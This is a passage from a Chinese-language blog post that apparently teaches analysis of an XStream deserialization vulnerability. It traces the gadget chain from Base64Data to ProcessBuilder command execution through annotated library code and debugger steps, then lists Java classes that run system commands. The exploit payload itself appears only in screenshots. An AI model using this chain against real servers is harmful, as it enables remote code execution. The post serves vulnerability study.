值，然后再进行序列化</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p><blockquote><p>具体开展分析</p></blockquote><p>分析其利用链（Gadgets），通过 <code>Poc</code> 可发现，其最后执行命令使用了 <code>java.lang.ProcessBuilder</code> 类中的 <code>start()</code> 方法，现我们跟进类中的 <code>start()</code> 获取整个利用链</p><p><em>注释：<code>java.lang.ProcessBuilder</code> 是 Java 标准库中的一个类，用于创建和管理外部进程。它提供了一种在 Java 程序中执行外部命令的方式，通过<code>java.lang.ProcessBuilder</code>  可以指定要执行的命令及其参数，并设置执行命令时的环境变量、工作目录等。然后使用 <code>start()</code> 方法来启动进程，并获取与该进程相关的输入流、输出流和错误流。</em></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819150846588.png" data-caption="image-20230819150846588"><img src="/../images/Java/deserialization/image-20230819150846588.png" alt="image-20230819150846588"></a></p><p>因为 <code>xstreaam</code> 中已经包含了 <code>java.lang.ProcessBuilder</code> 类，所以我们在代码中并不需要导入，但我们可以通过先导入方便我们进行分析，跟进其代码便于找到 <code>start()</code> 方法</p><p>现导入 <code>import java.lang.ProcessBuilder;</code> 然后将<code>鼠标移至 ProcessBuilder + 鼠标左键</code>，进入 <code>ProcessBuilder</code> 类</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144037081.png" data-caption="image-20230817144037081"><img src="/../images/Java/deserialization/image-20230817144037081.png" alt="image-20230817144037081"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144218001.png" data-caption="image-20230817144218001"><img src="/../images/Java/deserialization/image-20230817144218001.png" alt="image-20230817144218001"></a></p><p>进入到 <code>ProcessBuilder</code> 类后，继续寻找 <code>start()</code> 方法，鼠标选中 <code>ProcessBuilder</code> 后，鼠标移至停留，弹出该类的具体描述，简单的意思是：<code>java.lang.ProcessBuilder</code> 是 Java 标准库中的一个类，用于创建操作系统进程。每个 <code>ProcessBuilder</code> 实例管理一组进程属性。<code>start()</code> 方法使用这些属性创建一个新的 <code>Process</code> 实例。可以从同一个 <code>ProcessBuilder</code> 实例重复调用 <code>start()</code> 方法，以创建具有相同或相关属性的新子进程。具体可自行翻译查看。</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144435568.png" data-caption="image-20230817144435568"><img src="/../images/Java/deserialization/image-20230817144435568.png" alt="image-20230817144435568"></a></p><p>接着我们点击图中的 <code>start()</code> 方法进入到 <code>start()</code> 方法的具体描述，最后通过 <code>鼠标右键</code> 该描述 <code>Jump to Source</code> 进入到 <code>java.lang.ProcessBuilder#start()</code> 方法中 </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145146400.png" data-caption="image-20230817145146400"><img src="/../images/Java/deserialization/image-20230817145146400.png" alt="image-20230817145146400"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145324226.png" data-caption="image-20230817145324226"><img src="/../images/Java/deserialization/image-20230817145324226.png" alt="image-20230817145324226"></a></p><p>通过 <code>Poc</code> 可知最后执行的是由 <code>java.lang.ProcessBuilder</code> 类下的 <code>command</code> 对象触发命令执行，所以断点如下：</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145652475.png" data-caption="image-20230817145652475"><img src="/../images/Java/deserialization/image-20230817145652475.png" alt="image-20230817145652475"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150416568.png" data-caption="image-20230817150416568"><img src="/../images/Java/deserialization/image-20230817150416568.png" alt="image-20230817150416568"></a></p><p>返回 <code>XStreamExample.java</code> 文件中运行 <code>debug</code> ，鼠标右键点击 Debug 按钮，获得该代码的完整利用链</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150621674.png" data-caption="image-20230817150621674"><img src="/../images/Java/deserialization/image-20230817150621674.png" alt="image-20230817150621674"></a></p><p>完整利用链（Gadgets）如下</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817154237775.png" data-caption="image-20230817154237775"><img src="/../images/Java/deserialization/image-20230817154237775.png" alt="image-20230817154237775"></a></p><p>知道完整调用链，现回到 <code>XStreamExample.java</code> 对 <code>xstream.fromXML()</code> 方法进行 <code>debug</code> ，逐一进行调试分析，通过不断的点点点点，发现调用链实在太长，最终还是通过上面分析出来的 <code>Gadgets</code> 直接直接定位漏洞点</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818191523527.png" data-caption="image-20230818191523527"><img src="/../images/Java/deserialization/image-20230818191523527.png" alt="image-20230818191523527"></a></p><p>回到 <code>ProcessBuilder.java</code> 文件下打下断点，重新获取完整的 <code>Gadgets</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818192007754.png" data-caption="image-20230818192007754"><img src="/../images/Java/deserialization/image-20230818192007754.png" alt="image-20230818192007754"></a></p><p>然后根据上面分析，我们知道 <code>XStream</code> 在进行序列化前，需要先将值利用 <code>HashMap()</code> 生成 <code>hash</code> 然后 <code>put</code> 到 <code>entry</code> 中，根据 <code>Poc</code> 及 <code>HashMap()</code> 关键字，我们定位到 </p><p>调用链 <code>putCurrentEntryIntoMap:107,MapCoverter(com.thoughtworks.xstream.converters.collections)</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818195409950.png" data-caption="image-20230818195409950"><img src="/../images/Java/deserialization/image-20230818195409950.png" alt="image-20230818195409950"></a></p><p>根据调用链向上分析，找到获取 <code>hash</code> 值的代码，调用了 <code>getStringValue()</code> 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818201645103.png" data-caption="image-20230818201645103"><img src="/../images/Java/deserialization/image-20230818201645103.png" alt="image-20230818201645103"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200313210.png" data-caption="image-20230818200313210"><img src="/../images/Java/deserialization/image-20230818200313210.png" alt="image-20230818200313210"></a></p><p>跟进 <code>getStringValue()</code> ， <code>Ctrl + 鼠标左键</code>，具体 <code>getStringValue()</code> 方法如下，代码大概意思是通过 <code>instanceof</code> 运算符检查 <code>this.value</code> 这个对象是否为字符串（String）类型，若表达式 <code>this.value instanceof String</code> 为 <code>true</code> 则将 <code>this.value</code> 这个对象强制转换为 <code>String</code> 类型并返回，若不是 <code>String</code> 类型则调用<code>this.value.toString()</code> 将 <code>this.value</code> 转换为字符串并返回</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200807155.png" data-caption="image-20230818200807155"><img src="/../images/Java/deserialization/image-20230818200807155.png" alt="image-20230818200807155"></a></p><p>根据调用链去到 <code>getStringValue()</code> , 由下图得知，<code>this.value</code> 的值为 <code>&#123;Base64Date@1473&#125;</code> 其中 Base64@Date 为对象的类名，1473是对象的哈希码</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202004137.png" data-caption="image-20230818202004137"><img src="/../images/Java/deserialization/image-20230818202004137.png" alt="image-20230818202004137"></a></p><p>由 Poc 可知，<code>this.value</code> 的值为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类，由于攻击者可通过 <code>xml</code> 控制 <code>NativeString</code> 元素的 <code>value</code> 子元素，构造了攻击，官方构建为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202344501.png" data-caption="image-20230818202344501"><img src="/../images/Java/deserialization/image-20230818202344501.png" alt="image-20230818202344501"></a></p><p>当 <code>this.value</code> 为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 时，程序调用 Base64Data 类的 <code>toString</code> 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202759615.png" data-caption="image-20230818202759615"><img src="/../images/Java/deserialization/image-20230818202759615.png" alt="image-20230818202759615"></a></p><p><code> Ctrl + 鼠标左键</code> 跟进<code>toString()</code> 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202847844.png" data-caption="image-20230818202847844"><img src="/../images/Java/deserialization/image-20230818202847844.png" alt="image-20230818202847844"></a></p><p>在 InputStream is 上打上断点，然后重新 debug </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819121943027.png" data-caption="image-20230819121943027"><img src="/../images/Java/deserialization/image-20230819121943027.png" alt="image-20230819121943027"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法返回类型为byte[]，表示该方法将返回一个字节数组</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] get() &#123;</span><br><span class="line">    <span class="comment">// 检查成员变量this.data是否为null</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.data == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个ByteArrayOutputStreamEx对象baos，并指定初始容量为1024字节</span></span><br><span class="line">            <span class="type">ByteArrayOutputStreamEx</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStreamEx</span>(<span class="number">1024</span>);</span><br><span class="line">            <span class="comment">// 从this.dataHandler.getDataSource().getInputStream()获取输入流is</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="built_in">this</span>.dataHandler.getDataSource().getInputStream();</span><br><span class="line">            <span class="comment">// 使用baos.readFrom(is)将输入流的内容读取到baos中</span></span><br><span class="line">            baos.readFrom(is);</span><br><span class="line">            <span class="comment">// 关闭输入流is</span></span><br><span class="line">            is.close();</span><br><span class="line">            <span class="comment">// 将baos.getBuffer()返回的内部字节数组赋值给this.data</span></span><br><span class="line">            <span class="built_in">this</span>.data = baos.getBuffer();</span><br><span class="line">            <span class="comment">// 将baos.size()返回的字节数赋值给this.dataLen</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = baos.size();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="comment">// 在执行上述操作的过程中发生IOException异常，则将this.dataLen设置为0</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>代码大意如下，由 Poc 和上图可知，这一程序执行步骤如下：</p><p>1、<code>this.dataHandler.getDataSource()</code>  是获取 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类中的 <code>dataHandler</code> 属性的<code>DataSource</code> 值，而   poc 中 DateSource 设置的是 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> 类，所以 <code>this.dataHandler.getDataSource()</code> 为 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123639794.png" data-caption="image-20230819123639794"><img src="/../images/Java/deserialization/image-20230819123639794.png" alt="image-20230819123639794"></a></p><p>2、然后程序继续往下执行，通过 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> 类的 <code>getInputStream</code> 方法，获取<code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc</code> 的 is 属性值</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123847457.png" data-caption="image-20230819123847457"><img src="/../images/Java/deserialization/image-20230819123847457.png" alt="image-20230819123847457"></a></p><p>继续跟踪，我们由上图可知， is 中设置的值为 <code>java.io.SequenceInputStream</code> 类，我们需要跟进该类，调用的是 该类的 <code>nextStream()</code> 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124515348.png" data-caption="image-20230819124515348"><img src="/../images/Java/deserialization/image-20230819124515348.png" alt="image-20230819124515348"></a></p><p><code>Ctrl + 鼠标左键</code> 跟进代码 </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nextStream()方法被声明为final，表示该方法不能被继承类重写。方法没有返回值，使用void表示</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">nextStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 检查成员变量in是否为null,如果in不为null，则调用in.close()关闭当前的输入流</span></span><br><span class="line">    <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 如果迭代器e有下一个元素，则调用e.nextElement()获取下一个元素，并将其强制转换为 InputStream 类型，并将结果赋值给in</span></span><br><span class="line">    <span class="keyword">if</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        in = (InputStream) e.nextElement();</span><br><span class="line">        <span class="comment">// 如果in为null，则抛出NullPointerException异常。</span></span><br><span class="line">        <span class="keyword">if</span> (in == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果迭代器e没有下一个元素，则将in赋值为null</span></span><br><span class="line">    <span class="keyword">else</span> in = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124734273.png" data-caption="image-20230819124734273"><img src="/../images/Java/deserialization/image-20230819124734273.png" alt="image-20230819124734273"></a></p><p>由 Poc 可知，is 下的 e 元素的值被设置为 <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125255722.png" data-caption="image-20230819125255722"><img src="/../images/Java/deserialization/image-20230819125255722.png" alt="image-20230819125255722"></a></p><p>继续根据调用链跟进  <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code>，其调用了该类的 nextElement() 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125438579.png" data-caption="image-20230819125438579"><img src="/../images/Java/deserialization/image-20230819125438579.png" alt="image-20230819125438579"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回类型为Object，表示该方法将返回一个对象</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">nextElement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="comment">// 当type的值为KEYS时，调用iterator.next()获取迭代器的下一个元素，调用获取到的元素的getKey()方法，返回元素的键</span></span><br><span class="line">        <span class="keyword">case</span> KEYS: <span class="keyword">return</span> iterator.next().getKey();</span><br><span class="line">        <span class="comment">// 当type的值为ELEMENTS时，调用iterator.next()获取迭代器的下一个元素，调用获取到的元素的getValue()方法，返回元素的值</span></span><br><span class="line">        <span class="keyword">case</span> ELEMENTS: <span class="keyword">return</span> iterator.next().getValue();</span><br><span class="line">        <span class="comment">// 如果type的值不是KEYS也不是ELEMENTS，即没有匹配的case，则执行default代码块，返回null</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>由 poc 可知，type  值为 KEY，则获取 iterator 下的元素</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130132192.png" data-caption="image-20230819130132192"><img src="/../images/Java/deserialization/image-20230819130132192.png" alt="image-20230819130132192"></a></p><p>继续跟进<code> &lt;iterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</code>  中的 <code>javax.imageio.spi.FilterIterator</code> 类，调用的是该类的 advance() 方法</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130431252.png" data-caption="image-20230819130431252"><img src="/../images/Java/deserialization/image-20230819130431252.png" alt="image-20230819130431252"></a></p><p><code>Ctrl + 鼠标左键</code> , 跟进代码</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130613686.png" data-caption="image-20230819130613686"><img src="/../images/Java/deserialization/image-20230819130613686.png" alt="image-20230819130613686"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// advance()方法是一个私有方法，没有返回值，使用void表示</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">advance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 在循环中，通过iter.next()获取迭代器的下一个元素，并将其赋值给泛型类型T的变量elt</span></span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">elt</span> <span class="operator">=</span> iter.next();</span><br><span class="line">        <span class="comment">// 如果满足过滤条件，将elt赋值给变量next，表示找到了下一个元素，并使用return语句提前结束方法,如果不满足过滤条件,则继续下一次循环，继续查找下一个满足条件的元素。</span></span><br><span class="line">        <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">            next = elt;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>再次回到 poc 中，将 iterator 展开，查看有哪些元素，其中 ierator 下 filter 是控制过滤条件 </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142118262.png" data-caption="image-20230819142118262"><img src="/../images/Java/deserialization/image-20230819142118262.png" alt="image-20230819142118262"></a></p><p>继续跟进 <code>javax.imageio.ImageIO$ContainsFilter</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142333905.png" data-caption="image-20230819142333905"><img src="/../images/Java/deserialization/image-20230819142333905.png" alt="image-20230819142333905"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法返回一个布尔值 接受 Object类型的参数 elt，表示要进行过滤的元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filter</span><span class="params">(Object elt)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用method.invoke(elt)方法，将elt作为参数，执行反射调用,反射调用返回一个Object类型的结果，需要将其强制转换为String[]类型</span></span><br><span class="line">        <span class="keyword">return</span> contains((String[])method.invoke(elt), name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>继续展开 poc 下 filter 下的元素，发现来到了触发执行命令的类，所以由于 <code>method.invoke(elt)</code> 可控，所以导致 method 可以通过 xml 中<code>javax.imageio.ImageIO$ContainsFilter</code> 元素包含的 method 元素被控制，method 里面的 <code>&lt;class&gt;</code> 为我们调用的恶意类,由于程序默认没有对其限制所以导致攻击者可利用 <code>java.lang.ProcessBuilder</code> 构造命令执行</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143335818.png" data-caption="image-20230819143335818"><img src="/../images/Java/deserialization/image-20230819143335818.png" alt="image-20230819143335818"></a></p><p>最后 <code>method.invoke(elt)</code> 执行命令，其中 elt 为构造好的 java.lang.ProcessBuilder 对象。所以在 method 与 elt 都可控的情况下，进行反射调用即可实现远程代码执行利用</p><p><em>注释：Java反射机制是指在运行时动态地获取和操作类的信息，包括类的属性、方法、构造函数等。通过反射，可以在程序运行时检查类的结构，创建对象，调用方法，访问和修改字段，甚至可以动态地生成新的类</em></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819152832987.png" data-caption="image-20230819152832987"><img src="/../images/Java/deserialization/image-20230819152832987.png" alt="image-20230819152832987"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143916112.png" data-caption="image-20230819143916112"><img src="/../images/Java/deserialization/image-20230819143916112.png" alt="image-20230819143916112"></a></p><p>最后回到了最初的 debug 起点，执行命令。</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143204447.png" data-caption="image-20230819143204447"><img src="/../images/Java/deserialization/image-20230819143204447.png" alt="image-20230819143204447"></a> </p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>通过对以上案例的分析，整个过程调试下来个人还是学到了不少，主要还是思路方面，对于整体调试思路有所帮助。总体上对于个人来说,在分析过程中无论是对 Java 基础的语法、代码的含义以及开发工具的运用等等均需要有点积累才能更好地开展分析调试工作。</p><h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="常见能能执行命令的-java-类"><a href="#常见能能执行命令的-java-类" class="headerlink" title="常见能能执行命令的 java 类"></a>常见能能执行命令的 java 类</h3><ul><li><p><code>java.lang.Runtime</code>：<code>Runtime</code>类提供了执行系统命令的方法，如<code>exec()</code>和<code>getRuntime()</code>。</p></li><li><p>java.lang.ProcessBuilder<code>：</code>ProcessBuilder&#96;类用于创建进程，并执行系统命令。它提供了更灵活的方式来执行命令，并可以设置环境变量、工作目录等。</p></li><li><p><code>java.lang.Process</code>：<code>Process</code>类表示正在运行的进程。可以使用<code>Process</code>类的方法来获取进程的输入流、输出流和错误流，以及等待进程完成并获取执行结果。</p></li><li><p><code>java.lang.ProcessImpl</code>：这是<code>Process</code>类的实现类，它是Java对底层操作系统进程的封装。</p></li></ul><p>使用 <code>Runtime</code> 类执行系统命令的示例：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemCommandExecution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>; <span class="comment">// 替换为你要执行的系统命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行的输出结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;命令执行完成，退出码：&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用 <code>ProcessBuilder</code> 类执行系统命令的示例：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行系统命令</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>&#125;; <span class="comment">// 替换为你要执行的系统命令及参数</span></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(command);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) 